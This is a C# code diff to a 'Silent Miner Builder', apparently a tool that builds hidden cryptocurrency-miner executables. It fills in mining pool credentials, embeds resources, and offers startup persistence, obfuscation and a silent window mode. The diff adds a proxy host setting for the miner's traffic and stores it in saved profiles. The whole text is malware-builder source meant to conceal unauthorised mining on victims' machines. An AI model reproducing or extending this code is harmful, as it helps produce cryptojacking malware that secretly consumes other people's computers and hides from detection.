@@ -38,6 +38,14 @@ namespace Silent_Miner_Builder
             .Replace("%libwinpthread%", Convert.ToBase64String(Properties.Resources.libwinpthread_1))
             .Replace("%zlib1%", Convert.ToBase64String(Properties.Resources.zlib1));
 
+           if(proxyprotocole.Text != String.Empty && proxyhost.Text != "IP:PORT")
+            {
+                stub = stub.Replace("%proxy%", proxyprotocole.Text + "://" + proxyhost.Text);
+            }
+           else
+            {
+                stub = stub.Replace("+ \" -x %proxy%\"", "");
+            }
                 if (startup.Checked == true)
                 {
                     stub = stub.Replace("%Startup();%", "Startup();")
@@ -57,6 +65,7 @@ namespace Silent_Miner_Builder
             {
                 stub = stub.Replace("%silentmode%", "NormalFocus");
             }
+                
         }
 
         private string RandomString(int size)
@@ -78,7 +87,8 @@ namespace Silent_Miner_Builder
             config = config.Replace("%pool%", "Pool|" + pool.Text)
                 .Replace("%user%", "User|" + user.Text)
                 .Replace("%password%", "Password|" + password.Text)
-                .Replace("%threads%", "Threads|" + threads.Value.ToString());
+                .Replace("%threads%", "Threads|" + threads.Value.ToString())
+                .Replace("%host%", "Host|" + proxyhost.Text);
 
             if(startup.Checked == true)
             {
@@ -141,6 +151,7 @@ namespace Silent_Miner_Builder
                     string[] persistences = line.Split('|');
                     string[] obf = line.Split('|');
                     string[] silent = line.Split('|');
+                    string[] host = line.Split('|');
 
                     if (pools[0] == "Pool")
                     {
@@ -160,6 +171,11 @@ namespace Silent_Miner_Builder
                     if (thread[0] == "Threads")
                     {
                         threads.Text = thread[1];
+                    }
+
+                    if(host[0] == "Host")
+                    {
+                        proxyhost.Text = host[1];
                     }
 
                     if(obf[0] == "Obf")
@@ -243,6 +259,11 @@ namespace Silent_Miner_Builder
         private void button3_Click(object sender, EventArgs e)
         {
             LoadProfile();
+        }
+
+        private void proxyhost_TextChanged(object sender, EventArgs e)
+        {
+
         }
     }
 }
